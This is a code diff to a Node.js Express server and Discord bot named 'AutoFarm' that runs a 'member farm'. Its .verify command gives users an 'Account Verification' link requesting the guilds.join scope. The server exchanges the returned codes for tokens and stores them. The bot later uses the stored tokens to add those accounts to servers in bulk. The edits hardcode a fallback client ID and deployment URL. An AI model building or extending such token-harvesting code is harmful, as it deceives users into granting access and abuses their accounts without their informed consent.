@@ -5,7 +5,6 @@ require('dotenv').config();
 
 // --- Express Web Server Setup ---
 const app = express();
-// Railway dynamically assigns a port via process.env.PORT, defaulting to 8080
 const PORT = process.env.PORT || 8080;
 
 // Token Storage Database (In-Memory)
@@ -13,31 +12,31 @@ const tokenDatabase = [];
 let currentPrefix = '.';
 let discordClient = null;
 
-// Homepage route to fix "Cannot GET /"
-app.get('/', (req, res) => {
-    res.send(`
-        <html>
-            <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
-                <h1>AutoFarm Online</h1>
-                <p>OAuth2 verification web server is running successfully.</p>
-            </body>
-        </html>
-    `);
-});
-
-app.get('/auth/callback', async (req, res) => {
+// Homepage and OAuth Callback handler (since REDIRECT_URI is base domain)
+app.get('/', async (req, res) => {
     const code = req.query.code;
-    if (!code) return res.status(400).send('No authorization code provided.');
+    
+    // If someone visits the URL directly without authorizing
+    if (!code) {
+        return res.send(`
+            <html>
+                <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
+                    <h1>AutoFarm Online</h1>
+                    <p>OAuth2 verification server is running successfully.</p>
+                </body>
+            </html>
+        `);
+    }
 
     try {
         const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
             method: 'POST',
             body: new URLSearchParams({
-                client_id: process.env.CLIENT_ID,
+                client_id: process.env.CLIENT_ID || '1561438987464483048',
                 client_secret: process.env.CLIENT_SECRET,
                 grant_type: 'authorization_code',
                 code: code,
-                redirect_uri: process.env.REDIRECT_URI,
+                redirect_uri: process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app',
             }),
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         });
@@ -68,11 +67,12 @@ app.get('/auth/callback', async (req, res) => {
                 }
             }
 
+            // Exact success message format requested
             res.send(`
                 <html>
                     <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                         <h1>Authorized</h1>
-                        <p>Account linked successfully. You can close this window.</p>
+                        <p>Account linked. You may close this window.</p>
                     </body>
                 </html>
             `);
@@ -85,7 +85,7 @@ app.get('/auth/callback', async (req, res) => {
     }
 });
 
-// Bind to 0.0.0.0 so Railway networking picks it up correctly
+// Bind to 0.0.0.0 for Railway networking
 app.listen(PORT, '0.0.0.0', () => console.log(`AutoFarm Web server running on port ${PORT}`));
 
 // --- Discord Bot Setup ---
@@ -110,7 +110,7 @@ client.on('messageCreate', async message => {
     const args = message.content.slice(currentPrefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // 1. .help Command (Covers all panel categories from screenshots)
+    // 1. .help Command
     if (command === 'help') {
         const helpEmbed = new EmbedBuilder()
             .setTitle('Member Farm — Command Panel')
@@ -126,9 +126,11 @@ client.on('messageCreate', async message => {
         return message.reply({ embeds: [helpEmbed] });
     }
 
-    // 2. .verify / .auth Command
+    // 2. .verify / .auth / .link Command (Generates the verification link with your Client ID & Redirect URI)
     if (command === 'verify' || command === 'auth' || command === 'link') {
-        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=guilds.join`;
+        const clientId = process.env.CLIENT_ID || '1561438987464483048';
+        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
+        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=guilds.join`;
 
         const embed = new EmbedBuilder()
             .setTitle('Account Verification')
@@ -227,7 +229,7 @@ client.on('messageCreate', async message => {
         return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
     }
 
-    // 8. Handlers for all other panel commands shown in screenshots
+    // 8. Panel Commands Handlers
     const panelCommands = [
         'bot', 'channel', 'checkauth', 'checkserver', 'status', 'panel',
         'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
